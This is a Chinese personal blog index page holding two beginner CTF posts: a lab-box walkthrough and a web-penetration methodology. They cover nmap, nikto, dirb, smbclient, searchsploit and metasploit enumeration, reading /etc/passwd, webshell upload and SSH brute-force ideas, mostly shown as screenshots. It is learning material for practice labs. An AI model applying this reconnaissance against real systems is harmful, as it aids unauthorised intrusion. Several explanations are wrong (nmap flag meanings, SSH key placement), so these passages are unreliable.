<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.3.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"wgc5.gitee.io","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="北极星上的稻草人">
<meta property="og:url" content="https://wgc5.gitee.io/page/3/index.html">
<meta property="og:site_name" content="北极星上的稻草人">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="北极星上的稻草人">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="https://wgc5.gitee.io/page/3/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'zh-CN'
  };
</script>

  <title>北极星上的稻草人</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">北极星上的稻草人</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
      <p class="site-subtitle" itemprop="description">稻草人笔记</p>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>首页</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签<span class="badge">22</span></a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类<span class="badge">9</span></a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档<span class="badge">59</span></a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://wgc5.gitee.io/2021/11/26/CTF%E6%B8%97%E9%80%8F%E5%BC%95%E5%85%A5/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="北极星上的稻草人">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="北极星上的稻草人">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/11/26/CTF%E6%B8%97%E9%80%8F%E5%BC%95%E5%85%A5/" class="post-title-link" itemprop="url">CTF渗透引入</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2021-11-26 11:08:09 / 修改时间：11:09:17" itemprop="dateCreated datePublished" datetime="2021-11-26T11:08:09+08:00">2021-11-26</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="CTF渗透引入"><a href="#CTF渗透引入" class="headerlink" title="CTF渗透引入"></a>CTF渗透引入</h1><p><img src="/2021/11/26/CTF%E6%B8%97%E9%80%8F%E5%BC%95%E5%85%A5/image-20211030153041568.png" alt="image-20211030153041568"></p>
<p><strong>一般渗透步骤：</strong>信息探测-&gt;深入探测-&gt;信息分析-&gt;</p>
<p>​                        （协议弱点利用-&gt;寻找协议软件版本漏洞-&gt;爆力破解）-&gt;获取flag</p>
<h3 id="步骤1：信息探测"><a href="#步骤1：信息探测" class="headerlink" title="步骤1：信息探测"></a>步骤1：信息探测</h3><p><img src="/2021/11/26/CTF%E6%B8%97%E9%80%8F%E5%BC%95%E5%85%A5/image-20211030153245365.png" alt="image-20211030153245365"></p>
<p>nikto，dirb：探测开发http服务的主机所开放的目录、地址、配置文件等</p>
<p><img src="/2021/11/26/CTF%E6%B8%97%E9%80%8F%E5%BC%95%E5%85%A5/image-20211030153218829.png" alt="image-20211030153218829"></p>
<p><img src="/2021/11/26/CTF%E6%B8%97%E9%80%8F%E5%BC%95%E5%85%A5/image-20211030153502368.png" alt="image-20211030153502368"></p>
<h3 id="步骤2：深入挖掘"><a href="#步骤2：深入挖掘" class="headerlink" title="步骤2：深入挖掘"></a>步骤2：深入挖掘</h3><p><img src="/2021/11/26/CTF%E6%B8%97%E9%80%8F%E5%BC%95%E5%85%A5/image-20211030153826666.png" alt="image-20211030153826666"></p>
<p>利用nc扫描大端口非http服务</p>
<p><img src="/2021/11/26/CTF%E6%B8%97%E9%80%8F%E5%BC%95%E5%85%A5/image-20211030154207937.png" alt="image-20211030154207937"></p>
<p><img src="/2021/11/26/CTF%E6%B8%97%E9%80%8F%E5%BC%95%E5%85%A5/image-20211030154340275.png" alt="image-20211030154340275"></p>
<p>直接访问大端口http服务</p>
<p>由namp -T4 -A -v 靶场ip的结果可以得到一些不知道（自定义）服务名字的实际服务类型</p>
<p><img src="/2021/11/26/CTF%E6%B8%97%E9%80%8F%E5%BC%95%E5%85%A5/image-20211030154643090.png" alt="image-20211030154643090"></p>
<p><img src="/2021/11/26/CTF%E6%B8%97%E9%80%8F%E5%BC%95%E5%85%A5/image-20211030154708106.png" alt="image-20211030154708106"></p>
<p><img src="/2021/11/26/CTF%E6%B8%97%E9%80%8F%E5%BC%95%E5%85%A5/image-20211030154816668.png" alt="image-20211030154816668"></p>
<p><img src="/2021/11/26/CTF%E6%B8%97%E9%80%8F%E5%BC%95%E5%85%A5/image-20211030154938348.png" alt="image-20211030154938348"></p>
<p><img src="/2021/11/26/CTF%E6%B8%97%E9%80%8F%E5%BC%95%E5%85%A5/image-20211030155021568.png" alt="image-20211030155021568"></p>
<p>查看敏感文件</p>
<p><img src="/2021/11/26/CTF%E6%B8%97%E9%80%8F%E5%BC%95%E5%85%A5/image-20211030155041199.png" alt="image-20211030155041199"></p>
<p>http文件要看源代码</p>
<p>找到了一个密码winter</p>
<p><img src="/2021/11/26/CTF%E6%B8%97%E9%80%8F%E5%BC%95%E5%85%A5/image-20211030155152337.png" alt="image-20211030155152337"></p>
<h4 id="进一步深入挖掘"><a href="#进一步深入挖掘" class="headerlink" title="进一步深入挖掘"></a>进一步深入挖掘</h4><p><img src="/2021/11/26/CTF%E6%B8%97%E9%80%8F%E5%BC%95%E5%85%A5/image-20211030155316721.png" alt="image-20211030155316721"></p>
<p>a、ftp</p>
<p><img src="/2021/11/26/CTF%E6%B8%97%E9%80%8F%E5%BC%95%E5%85%A5/image-20211030155522357.png" alt="image-20211030155522357"></p>
<p><img src="/2021/11/26/CTF%E6%B8%97%E9%80%8F%E5%BC%95%E5%85%A5/image-20211030155543922.png" alt="image-20211030155543922"></p>
<p>b、robots.txt</p>
<p><img src="/2021/11/26/CTF%E6%B8%97%E9%80%8F%E5%BC%95%E5%85%A5/image-20211030155707997.png" alt="image-20211030155707997"></p>
<p>访问robots.txt目录下的可疑文件</p>
<p><img src="/2021/11/26/CTF%E6%B8%97%E9%80%8F%E5%BC%95%E5%85%A5/image-20211030155757357.png" alt="image-20211030155757357"></p>
<p>有输入就有可能存在注入漏洞（sql）</p>
<p><img src="/2021/11/26/CTF%E6%B8%97%E9%80%8F%E5%BC%95%E5%85%A5/image-20211030155959746.png" alt="image-20211030155959746"></p>
<p>试探</p>
<p><img src="/2021/11/26/CTF%E6%B8%97%E9%80%8F%E5%BC%95%E5%85%A5/image-20211030160150379.png" alt="image-20211030160150379"></p>
<p>有用户，就可能需要用到密码（前面找到了一个密码winter）</p>
<p><img src="/2021/11/26/CTF%E6%B8%97%E9%80%8F%E5%BC%95%E5%85%A5/image-20211030160450424.png" alt="image-20211030160450424"></p>
<p>说明：1./etc/passwd是所有人都可以访问的用户目录文件。2.more命令的功能与cat命令相似</p>
<p><img src="/2021/11/26/CTF%E6%B8%97%E9%80%8F%E5%BC%95%E5%85%A5/image-20211030160626404.png" alt="image-20211030160626404"></p>
<p>到这里就获得了用户名（summer）和密码（winter）了；一般都是ssh服务（远程登录服务）需要用户和密码。</p>
<h3 id="步骤3：登录靶场机器"><a href="#步骤3：登录靶场机器" class="headerlink" title="步骤3：登录靶场机器"></a>步骤3：登录靶场机器</h3><p><img src="/2021/11/26/CTF%E6%B8%97%E9%80%8F%E5%BC%95%E5%85%A5/image-20211030161012147.png" alt="image-20211030161012147"></p>
<p><img src="/2021/11/26/CTF%E6%B8%97%E9%80%8F%E5%BC%95%E5%85%A5/image-20211030160928619.png" alt="image-20211030160928619"></p>
<p><img src="/2021/11/26/CTF%E6%B8%97%E9%80%8F%E5%BC%95%E5%85%A5/image-20211030161233894.png" alt="image-20211030161233894"></p>
<h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p><img src="/2021/11/26/CTF%E6%B8%97%E9%80%8F%E5%BC%95%E5%85%A5/image-20211030161336185.png" alt="image-20211030161336185"></p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  

      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="zh-CN">
    <link itemprop="mainEntityOfPage" href="https://wgc5.gitee.io/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="北极星上的稻草人">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="北极星上的稻草人">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/" class="post-title-link" itemprop="url">CTF-WEB渗透思路与技巧</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">发表于</span>
              

              <time title="创建时间：2021-11-26 11:04:23 / 修改时间：11:07:08" itemprop="dateCreated datePublished" datetime="2021-11-26T11:04:23+08:00">2021-11-26</time>
            </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">分类于</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/CTF/" itemprop="url" rel="index"><span itemprop="name">CTF</span></a>
                </span>
            </span>

          

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <h1 id="CTF-WEB渗透入门思路与技巧"><a href="#CTF-WEB渗透入门思路与技巧" class="headerlink" title="CTF-WEB渗透入门思路与技巧"></a>CTF-WEB渗透入门思路与技巧</h1><p>说明：图片只是一个展示效果，可能前后不对应</p>
<h2 id="步骤一：信息探测"><a href="#步骤一：信息探测" class="headerlink" title="步骤一：信息探测"></a>步骤一：信息探测</h2><h4 id="1、扫描主机服务信息以及服务版本"><a href="#1、扫描主机服务信息以及服务版本" class="headerlink" title="1、扫描主机服务信息以及服务版本"></a>1、扫描主机服务信息以及服务版本</h4><p><strong>a.**扫描主机</strong>开放的端口号<strong>：</strong>namp -p -T4 靶场ip地址**</p>
<p>参数说明：-p指端口，-T4指线程数为4</p>
<p><strong>b.快速扫描主机全部信息</strong>：<strong>namp -T4 -A -v 靶场ip地址</strong> </p>
<p>参数说明：-A指all（全部），-v指快速</p>
<p>说明：有时候b扫描方式的结果会漏（在端口开放扫描部分）</p>
<p><strong>c.探测开放服务信息</strong>：<strong>namp -sV 靶场ip地址</strong></p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211102200402655.png" alt="image-20211102200402655"></p>
<p>tip0：一般用b、c操作就足够了。</p>
<p>tip1：注意开放的服务与其可能存在的漏洞/攻击方法：ssh服务：远程登录；ftp服务：文件上传</p>
<p>tip3：后面所有操作都要考虑端口占用情况，可以用netstat -pantu来查看占用端口</p>
<h4 id="2、探测目录信息"><a href="#2、探测目录信息" class="headerlink" title="2、探测目录信息"></a>2、探测目录信息</h4><p>！！这里要求靶场开启了http服务！！</p>
<p>**a.**nikto -host http://靶场IP地址：端口 </p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211104160032606.png" alt="image-20211104160032606"></p>
<p>**b.**dirb http://靶场IP地址：端口</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211104155903347.png" alt="image-20211104155903347"></p>
<p>说明：</p>
<p>（1）端口不填，默认是80端口；</p>
<p>（2）虽然都是探测目录信息，但探测到的信息往往是互补的，a操作侧重于敏感信息，b操作侧重于敏感目录。</p>
<h4 id="3、用sparta探测（图形化界面工具）"><a href="#3、用sparta探测（图形化界面工具）" class="headerlink" title="3、用sparta探测（图形化界面工具）"></a>3、用sparta探测（图形化界面工具）</h4><p>启动软件（kali自带）</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211104152216258.png" alt="image-20211104152216258"></p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211104152211299.png" alt="image-20211104152211299"></p>
<p>软件会进行namp、nikto、screenshot扫描</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211104152242903.png" alt="image-20211104152242903"></p>
<p>点击下面的扫描模块就可以查看详情，也可以单独对某个端口进行扫描</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211104152303730.png" alt="image-20211104152303730"></p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211104152331126.png" alt="image-20211104152331126"></p>
<p>还可以用dirt进行暴力探测</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211104152341971.png" alt="image-20211104152341971"></p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211104152348212.png" alt="image-20211104152348212"></p>
<h2 id="步骤2：深入挖掘信息-分析探测结果"><a href="#步骤2：深入挖掘信息-分析探测结果" class="headerlink" title="步骤2：深入挖掘信息/分析探测结果"></a>步骤2：深入挖掘信息/分析探测结果</h2><h3 id="端口-服务利用"><a href="#端口-服务利用" class="headerlink" title="端口/服务利用"></a>端口/服务利用</h3><h4 id="1、大端口利用"><a href="#1、大端口利用" class="headerlink" title="1、大端口利用"></a>1、大端口利用</h4><p>​    常用端口为0~1023，要注意大于1024的端口和一些不知名或乱起名的服务</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211102202748686.png" alt="image-20211102202748686"></p>
<p>技巧1：利用nc扫描大端口（非http服务）</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211102203709341.png" alt="image-20211102203709341"></p>
<p>技巧2：直接访问大端口http服务</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211102204232751.png" alt="image-20211102204232751"></p>
<h4 id="2、SMB服务利用"><a href="#2、SMB服务利用" class="headerlink" title="2、SMB服务利用"></a>2、SMB服务利用</h4><p>​    SMB协议又叫samba，是一种通讯协议，它基于TCP协议，一般使用139、445端口。SMB允许计算机访问网络资源，下载对应的源文件。</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211102214659335.png" alt="image-20211102214659335"></p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211102214559780.png" alt="image-20211102214559780"></p>
<p><strong>a、smbclient -L IP：</strong>扫描出对应IP地址的主机共享的文件夹</p>
<p>（若空密码不行，可能需要另外方法寻找方法）</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211102215008230.png" alt="image-20211102215008230"></p>
<p><strong>b、smbclient  ‘\\IP\$share’：</strong>查看对应IP主机上的共享文件（share指文件名）</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211102215117240.png" alt="image-20211102215117240"></p>
<p><strong>c、get （敏感信息）文件名：</strong>下载文件</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211102215227610.png" alt="image-20211102215227610"></p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211102215245319.png" alt="image-20211102215245319"></p>
<p><strong>d、searchsploit samba 版本号：</strong>查看某个版本号的SMB协议是否有（溢出）漏洞：这里没有</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211030105045103.png" alt="image-20211030105045103"></p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211102220133905.png" alt="image-20211102220133905"></p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211102220153317.png" alt="image-20211102220153317"></p>
<h4 id="3、ssh服务利用"><a href="#3、ssh服务利用" class="headerlink" title="3、ssh服务利用"></a>3、ssh服务利用</h4><p>​    SSH（secure shell）是基于TCP 22号端口的服务，是建立在应用层基础上的安全协议，它专为远程登录会话和其他网络服务提供安全性的协议，利用SSH协议可以有效防止远程管理过程中的信息泄露问题。</p>
<p><strong>ssh远程登录：</strong>ssh -p 用户名@ip地址</p>
<h5 id="ssh协议认证机制及其漏洞利用"><a href="#ssh协议认证机制及其漏洞利用" class="headerlink" title="ssh协议认证机制及其漏洞利用"></a>ssh协议认证机制及其漏洞利用</h5><p><strong>a.基于口令的安全验证：</strong>利用账号和口令就可以登录远程主机；传输的数据会被加密，但不能保证正在连接的服务器就是你想连接的服务器，因此会受到“中间人”攻击（有人冒充服务器）。</p>
<p><strong>漏洞利用</strong>：基于字典的暴力破解，破解对应用户名和密码，通过ssh客户端服务连接远程主机的ssh服务，实现对服务器的一定控制。</p>
<p><strong>b.基于密钥的安全验证：</strong>需要依靠密钥，用户必须创建一对密钥（公钥和私钥），把私钥放在服务器上，通过SSH连接服务器时提供正确私钥即可登录。</p>
<p><strong>漏洞利用：</strong>通过对主机信息收集，获取到泄露的用户名和对应的密钥</p>
<h4 id="4、FTP服务利用"><a href="#4、FTP服务利用" class="headerlink" title="4、FTP服务利用"></a>4、FTP服务利用</h4><p>​    FTP服务是一个文件传输协议。</p>
<p>漏洞利用：在浏览器中输入 ftp://靶场IP地址，进行匿名登录ftp根目录，再查看敏感文件（配置文件要查看源代码）。</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211104153117467.png" alt="image-20211104153117467"></p>
<h3 id="目录利用"><a href="#目录利用" class="headerlink" title="目录利用"></a>目录利用</h3><p>​    对于用dirt、nikto等工具探测到的目录，要特备关注一些敏感目录/文件；如名字带有：</p>
<p>​        ●admin：管理员界面，一般是服务器后台界面或其登录界面</p>
<p>​        ●passwd：password的缩写，尝包含密码信息</p>
<p>​        ●shadow：常保存用户名，与passwd的密码匹配</p>
<p>​        ●index：主页，往往会留下提示/漏洞，需要审计其源码</p>
<p>​        ●robots：隐藏文件目录，常保存敏感文件</p>
<p>​        ●backup：备份文件，常保存密钥等敏感文件</p>
<p>​        ●config：配置文件，常可以发现漏洞/密钥信息，需要审计源码（要留意注释）</p>
<p>​        ●login：登录界面，先尝试弱密码登录，要么需要寻找用户名和口令/密钥，要么利用注入漏洞，最后才用爆破法</p>
<p>​        ●home：普通用户根目录，有时可以发现用户名等敏感信息</p>
<p>​        ●upload：上传文件，常需要上传webshell获取shell</p>
<p>​        ●download：下载文件，常可以下载敏感文件</p>
<p>​        ●.php/.python等：可代码审计，已达到利用语句或发现漏洞</p>
<p>​        ●mysql/sql/__db：数据库，需要登录其数据库，查找用户名和密码</p>
<p>​        ●ssi：可能存在ssi漏洞的页面</p>
<p>​        ●.txt文件：常存有密钥（可能是加密形式）、口令、用户名等信息</p>
<p>​        ●icon：特别文件</p>
<p>​        ●wordpress（wp缩写）：常保存与密钥或登录的相关信息</p>
<p>​        ●ssh/samba等：对应漏洞的利用</p>
<p>​        ●secure：敏感文件</p>
<p>​        ●nothing：常是假404页面，需要代码审计</p>
<p>​    还有根目录和一些乱七八糟的目录需要注意；有时候文件/目录背后会有提示该文件/目录是敏感的。对于敏感网站还要查看其源码（注意注释、代码审计等），如主页、登录界面等等页面</p>
<p>如：</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211104161211476.png" alt="image-20211104161211476"></p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211104160837857.png" alt="image-20211104160837857"></p>
<p>​    目录利用是信息挖掘最重要的一步，往往很多重要的信息（用户名、密钥、敏感漏洞）都是在这一步发现的。</p>
<h2 id="步骤3：弱点-漏洞扫描-信息利用"><a href="#步骤3：弱点-漏洞扫描-信息利用" class="headerlink" title="步骤3：弱点/漏洞扫描/信息利用"></a>步骤3：弱点/漏洞扫描/信息利用</h2><h3 id="漏洞扫描"><a href="#漏洞扫描" class="headerlink" title="漏洞扫描"></a>漏洞扫描</h3><h4 id="1、使用metasploit扫描漏洞"><a href="#1、使用metasploit扫描漏洞" class="headerlink" title="1、使用metasploit扫描漏洞"></a>1、使用metasploit扫描漏洞</h4><p>a、seachsploit 服务的软件版本查找漏洞信息</p>
<p>服务的软件版本号可以用namp -sV ip地址查询</p>
<p>如：扫描ftp服务的软件</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211104153707417.png" alt="image-20211104153707417"></p>
<p>ProFTPD是ftp服务的软件，1.3.3c是版本号</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211104153947435.png" alt="image-20211104153947435"></p>
<p>b、使用metasploit的search查找漏洞模块</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211104193152596.png" alt="image-20211104193152596"></p>
<h4 id="2、使用owasp-zap扫描漏洞"><a href="#2、使用owasp-zap扫描漏洞" class="headerlink" title="2、使用owasp-zap扫描漏洞"></a>2、使用owasp-zap扫描漏洞</h4><p>​    kali自带owasp-zap</p>
<p>终端启动</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211104194037138.png" alt="image-20211104194037138"></p>
<p>图形化界面启动</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211104193650252.png" alt="image-20211104193650252"></p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211104193655617.png" alt="image-20211104193655617"></p>
<h4 id="3、使用AVWS（Acunetix）扫描漏洞"><a href="#3、使用AVWS（Acunetix）扫描漏洞" class="headerlink" title="3、使用AVWS（Acunetix）扫描漏洞"></a>3、使用AVWS（Acunetix）扫描漏洞</h4><p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211104195647852.png" alt="image-20211104195647852"></p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211104195806884.png" alt="image-20211104195806884"></p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211104195832261.png" alt="image-20211104195832261"></p>
<h4 id="4、探测中间件PUT漏洞"><a href="#4、探测中间件PUT漏洞" class="headerlink" title="4、探测中间件PUT漏洞"></a>4、探测中间件PUT漏洞</h4><p>​    只要HTTP方法开启了PUT功能，PUT可以直接从客户机上传文件到服务器。 探测http开启中间件指令：curl -v -X OPTIONS 目标地址</p>
<p><img src="/2021/11/26/CTF-WEB%E6%B8%97%E9%80%8F%E6%80%9D%E8%B7%AF%E4%B8%8E%E6%8A%80%E5%B7%A7/image-20211104194628075.png" alt="image-20211104194628075"></p>
<h3 id="弱点漏洞"><a href="#弱点漏洞" class="headerlink" title="弱点漏洞"></a>弱点漏洞</h3><p>有输入的地方，就可以存在注入漏洞！；具体操作查看本博客对应的文章</p>
